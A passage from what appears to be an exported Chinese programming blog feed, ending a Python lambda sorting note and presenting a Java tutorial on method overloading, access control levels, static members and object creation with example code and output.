class="string">'i'</span>, 12), (<span class="string">'a'</span>, 24), (<span class="string">'k'</span>, 33), (<span class="string">'g'</span>, 52)]</span><br></pre></td></tr></table></figure></div><p>  lambda是一个隐函数，是固定写法，不要写成别的单词；x表示列表中的一个元素，在这里，表示一个元组，x只是临时起的一个名字，你可以使用任意的名字；x[0]表示元组里的第一个元素，当然第二个元素就是x[1]</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象</title>
      <link href="/2019/01/31/java-mian-xiang-dui-xiang/"/>
      <url>/2019/01/31/java-mian-xiang-dui-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><blockquote><h4 id="MethodOverloading-java"><a href="#MethodOverloading-java" class="headerlink" title="MethodOverloading.java"></a>MethodOverloading.java</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodOverloading</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">receive</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"接收到一个int参数"</span>);</span><br><span class="line">        System.out.println(<span class="string">"i = "</span>+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">receive</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"接收到两个int参数。"</span>);</span><br><span class="line">        System.out.printf(<span class="string">"x = %d,y = %d \n"</span>,x,y);</span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">receive</span><span class="params">(<span class="keyword">double</span> x,<span class="keyword">double</span> y)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"接收到两个double参数。"</span>);</span><br><span class="line">        System.out.printf(<span class="string">"x = %f , y = %f \r"</span>,x,y);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><h4 id="mo-class-java"><a href="#mo-class-java" class="headerlink" title="mo_class.java"></a>mo_class.java</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mo_class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MethodOverloading mo = <span class="keyword">new</span> MethodOverloading();</span><br><span class="line"></span><br><span class="line">        mo.receive(<span class="number">1</span>);</span><br><span class="line">        mo.receive(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        mo.receive(<span class="number">2.0</span>,<span class="number">3.3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">接收到一个int参数</span><br><span class="line">i = 1</span><br><span class="line">接收到两个int参数。</span><br><span class="line">x = 2,y = 3 </span><br><span class="line">接收到两个double参数。</span><br><span class="line">x = 2.000000 , y = 3.300000</span><br></pre></td></tr></table></figure></div><h2 id="封装性与访问控制"><a href="#封装性与访问控制" class="headerlink" title="封装性与访问控制"></a>封装性与访问控制</h2><blockquote><h4 id="Java-面向对象的封装性是通过对成员变量和方法进行访问控制实现的，访问控制分为-4-个等级：私有、默认、保护和公有"><a href="#Java-面向对象的封装性是通过对成员变量和方法进行访问控制实现的，访问控制分为-4-个等级：私有、默认、保护和公有" class="headerlink" title="Java 面向对象的封装性是通过对成员变量和方法进行访问控制实现的，访问控制分为 4 个等级：私有、默认、保护和公有"></a>Java 面向对象的封装性是通过对成员变量和方法进行访问控制实现的，访问控制分为 4 个等级：私有、默认、保护和公有</h4><table><thead><tr><th align="center">控制等级</th><th align="center">同一个类</th><th align="center">同一个包</th><th align="center">不同包的子类</th><th align="center">不同包非子类</th></tr></thead><tbody><tr><td align="center">私有</td><td align="center">yes</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">默认</td><td align="center">yes</td><td align="center">yes</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">保护</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center"></td></tr><tr><td align="center">公有</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td></tr></tbody></table></blockquote><h3 id="私有级别"><a href="#私有级别" class="headerlink" title="私有级别"></a>私有级别</h3><blockquote><h4 id="私有级别的关键词是private，私有级别的成员变量和方法只能在其所在的类中自由使用，不允许其他类自由访问。私有级别限制性最高。"><a href="#私有级别的关键词是private，私有级别的成员变量和方法只能在其所在的类中自由使用，不允许其他类自由访问。私有级别限制性最高。" class="headerlink" title="私有级别的关键词是private，私有级别的成员变量和方法只能在其所在的类中自由使用，不允许其他类自由访问。私有级别限制性最高。"></a>私有级别的关键词是private，私有级别的成员变量和方法只能在其所在的类中自由使用，不允许其他类自由访问。私有级别限制性最高。</h4><h4 id="PrivateClass-java"><a href="#PrivateClass-java" class="headerlink" title="PrivateClass.java"></a>PrivateClass.java</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrivateClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> x ;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PrivateClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        x = <span class="number">5</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printX</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Values of x is "</span>+x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><h4 id="PC-class"><a href="#PC-class" class="headerlink" title="PC_class"></a>PC_class</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PC_class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        PrivateClass p;</span><br><span class="line">        p = <span class="keyword">new</span> PrivateClass();</span><br><span class="line">        p.printX();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error:(7, 10) java: printX() 在 basic_grammar.PrivateClass 中是 private 访问控制</span><br></pre></td></tr></table></figure></div><h4 id="p-printX-是私有的所以无法调用。"><a href="#p-printX-是私有的所以无法调用。" class="headerlink" title="p.printX();是私有的所以无法调用。"></a>p.printX();是私有的所以无法调用。</h4><h3 id="默认级别"><a href="#默认级别" class="headerlink" title="默认级别"></a>默认级别</h3><blockquote><h4 id="默认级别没有关键词，也就是没有访问修饰符，在不同包的类中是不允许被访问的。"><a href="#默认级别没有关键词，也就是没有访问修饰符，在不同包的类中是不允许被访问的。" class="headerlink" title="默认级别没有关键词，也就是没有访问修饰符，在不同包的类中是不允许被访问的。"></a>默认级别没有关键词，也就是没有访问修饰符，在不同包的类中是不允许被访问的。</h4><h4 id="DefaultClass-java"><a href="#DefaultClass-java" class="headerlink" title="DefaultClass.java"></a>DefaultClass.java</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DefaultClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        x = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"x = "</span>+x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><h4 id="DC-class-java"><a href="#DC-class-java" class="headerlink" title="DC_class.java"></a>DC_class.java</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DC_class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        DefaultClass p;</span><br><span class="line">        p = <span class="keyword">new</span> DefaultClass();</span><br><span class="line">        p.printX();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = 100</span><br></pre></td></tr></table></figure></div><h4 id="若在不同包体去编译执行，将会报错。"><a href="#若在不同包体去编译执行，将会报错。" class="headerlink" title="若在不同包体去编译执行，将会报错。"></a>若在不同包体去编译执行，将会报错。</h4><h3 id="公有级别"><a href="#公有级别" class="headerlink" title="公有级别"></a>公有级别</h3><blockquote><h4 id="公有级别的关键词是-public，公有级别的成员常量和方法可以再任何场合被直接调用。"><a href="#公有级别的关键词是-public，公有级别的成员常量和方法可以再任何场合被直接调用。" class="headerlink" title="公有级别的关键词是 public，公有级别的成员常量和方法可以再任何场合被直接调用。"></a>公有级别的关键词是 public，公有级别的成员常量和方法可以再任何场合被直接调用。</h4><h4 id="PublicClass-java"><a href="#PublicClass-java" class="headerlink" title="PublicClass.java"></a>PublicClass.java</h4> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PublicClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> x ;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PublicClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        x = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"x = "</span>+x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><blockquote><h4 id="PublicClass-class-java"><a href="#PublicClass-class-java" class="headerlink" title="PublicClass_class.java"></a>PublicClass_class.java</h4>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">package</span> basic_grammar.basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> basic_grammar.PublicClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PublicClass_class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        PublicClass p;</span><br><span class="line">        p = <span class="keyword">new</span> PublicClass();</span><br><span class="line">        p.printX();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = 100</span><br></pre></td></tr></table></figure></div><h3 id="保护级别"><a href="#保护级别" class="headerlink" title="保护级别"></a>保护级别</h3><blockquote><h4 id="保护级别的关键词protected，保护级别在同一包中完全与默认访问级别一样，但不同包中子类可继承父类中的protected的变量和方法。"><a href="#保护级别的关键词protected，保护级别在同一包中完全与默认访问级别一样，但不同包中子类可继承父类中的protected的变量和方法。" class="headerlink" title="保护级别的关键词protected，保护级别在同一包中完全与默认访问级别一样，但不同包中子类可继承父类中的protected的变量和方法。"></a>保护级别的关键词protected，保护级别在同一包中完全与默认访问级别一样，但不同包中子类可继承父类中的protected的变量和方法。</h4><h4 id="ProtectedClass-java"><a href="#ProtectedClass-java" class="headerlink" title="ProtectedClass.java"></a>ProtectedClass.java</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectedClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> x;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ProtectedClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        x = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">printX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"value of is "</span>+x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><h4 id="ProtectedClass-class-java"><a href="#ProtectedClass-class-java" class="headerlink" title="ProtectedClass_class.java"></a>ProtectedClass_class.java</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectedClass_class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ProtectedClass p;</span><br><span class="line">        p = <span class="keyword">new</span> ProtectedClass();</span><br><span class="line">        p.printX();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="同一个包下保护级别和默认级别没有区别，不同包下也无法直接访问printX。需要在不同包内继承ProtectedClass类。"><a href="#同一个包下保护级别和默认级别没有区别，不同包下也无法直接访问printX。需要在不同包内继承ProtectedClass类。" class="headerlink" title="同一个包下保护级别和默认级别没有区别，不同包下也无法直接访问printX。需要在不同包内继承ProtectedClass类。"></a>同一个包下保护级别和默认级别没有区别，不同包下也无法直接访问printX。需要在不同包内继承ProtectedClass类。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar.basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> basic_grammar.ProtectedClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectedClass_class</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">ProtectedClass</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">diskplay</span><span class="params">()</span></span>&#123;</span><br><span class="line">            printX();</span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value of is 100</span><br></pre></td></tr></table></figure></div><h4 id="不同包中SubClass从ProtectedClass类中继承了printX-方法和x实例变量。"><a href="#不同包中SubClass从ProtectedClass类中继承了printX-方法和x实例变量。" class="headerlink" title="不同包中SubClass从ProtectedClass类中继承了printX()方法和x实例变量。"></a>不同包中SubClass从ProtectedClass类中继承了printX()方法和x实例变量。</h4><blockquote><h4 id="访问成员有两种方式：一种是调用，通过类或对象调用成员，如p-printX-另一种是继承，子类继承父类的成员变量和方法。"><a href="#访问成员有两种方式：一种是调用，通过类或对象调用成员，如p-printX-另一种是继承，子类继承父类的成员变量和方法。" class="headerlink" title="访问成员有两种方式：一种是调用，通过类或对象调用成员，如p.printX().另一种是继承，子类继承父类的成员变量和方法。"></a>访问成员有两种方式：一种是调用，通过类或对象调用成员，如p.printX().另一种是继承，子类继承父类的成员变量和方法。</h4></blockquote><h3 id="静态变量和静态方法"><a href="#静态变量和静态方法" class="headerlink" title="静态变量和静态方法"></a>静态变量和静态方法</h3><blockquote><h4 id="Account-java"><a href="#Account-java" class="headerlink" title="Account.java"></a>Account.java</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Account</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> mount = <span class="number">0.0</span>;</span><br><span class="line">    String owner ;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">double</span> interestRate = <span class="number">0.0668</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">interestBy</span><span class="params">(<span class="keyword">double</span> amt)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> interestRate * amt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">messageWith</span><span class="params">(<span class="keyword">double</span> amt)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> interest = Account.interestBy(amt);</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        sb.append(owner).append(<span class="string">"的利息是"</span>).append(interest);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><h4 id="Account-class"><a href="#Account-class" class="headerlink" title="Account_class"></a>Account_class</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Account_class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(Account.interestRate);</span><br><span class="line">        System.out.println(Account.interestBy(<span class="number">1000</span>));</span><br><span class="line">        Account myaccount = <span class="keyword">new</span> Account();</span><br><span class="line">        myaccount.mount =  <span class="number">1000000</span>;</span><br><span class="line">        myaccount.owner =  <span class="string">"Tony"</span>;</span><br><span class="line">        System.out.println(myaccount.messageWith(<span class="number">1000</span>));</span><br><span class="line">        System.out.println(myaccount.interestRate);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0.0668</span><br><span class="line">66.8</span><br><span class="line">Tony的利息是66.8</span><br><span class="line">0.0668</span><br></pre></td></tr></table></figure></div><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><blockquote><h4 id="实例化可生产对象，实例方法就是对象方法-，实例变量就是对象属性。一个对象的周期包括三个阶段：创建，使用和销毁。"><a href="#实例化可生产对象，实例方法就是对象方法-，实例变量就是对象属性。一个对象的周期包括三个阶段：创建，使用和销毁。" class="headerlink" title="实例化可生产对象，实例方法就是对象方法 ，实例变量就是对象属性。一个对象的周期包括三个阶段：创建，使用和销毁。"></a>实例化可生产对象，实例方法就是对象方法 ，实例变量就是对象属性。一个对象的周期包括三个阶段：创建，使用和销毁。</h4></blockquote><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><blockquote><h4 id="创建对象包括两个步骤：声明和实例化。"><a href="#创建对象包括两个步骤：声明和实例化。" class="headerlink" title="创建对象包括两个步骤：声明和实例化。"></a>创建对象包括两个步骤：声明和实例化。</h4></blockquote><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><blockquote><h5 id="声明对象与声明普通变量没有什么区别。"><a href="#声明对象与声明普通变量没有什么区别。" class="headerlink" title="声明对象与声明普通变量没有什么区别。"></a>声明对象与声明普通变量没有什么区别。</h5></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type objectName;</span><br></pre></td></tr></table></figure></div><h5 id="type是引用类型，即类，接口和数组。"><a href="#type是引用类型，即类，接口和数组。" class="headerlink" title="type是引用类型，即类，接口和数组。"></a>type是引用类型，即类，接口和数组。</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String  name;</span><br></pre></td></tr></table></figure></div><h5 id="该语句声明了字符串类型对象name。可以声明并不为对象分配内存空间，而只是分配一个引用。"><a href="#该语句声明了字符串类型对象name。可以声明并不为对象分配内存空间，而只是分配一个引用。" class="headerlink" title="该语句声明了字符串类型对象name。可以声明并不为对象分配内存空间，而只是分配一个引用。"></a>该语句声明了字符串类型对象name。可以声明并不为对象分配内存空间，而只是分配一个引用。</h5><h4 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h4><blockquote><h5 id="实例化分为两个阶段：为对象分配内存空间和初始化对象。首先使用new运算符为对象分配内存空间，然后再调用构造方法初始化对象。"><a href="#实例化分为两个阶段：为对象分配内存空间和初始化对象。首先使用new运算符为对象分配内存空间，然后再调用构造方法初始化对象。" class="headerlink" title="实例化分为两个阶段：为对象分配内存空间和初始化对象。首先使用new运算符为对象分配内存空间，然后再调用构造方法初始化对象。"></a>实例化分为两个阶段：为对象分配内存空间和初始化对象。首先使用new运算符为对象分配内存空间，然后再调用构造方法初始化对象。</h5></blockquote><div 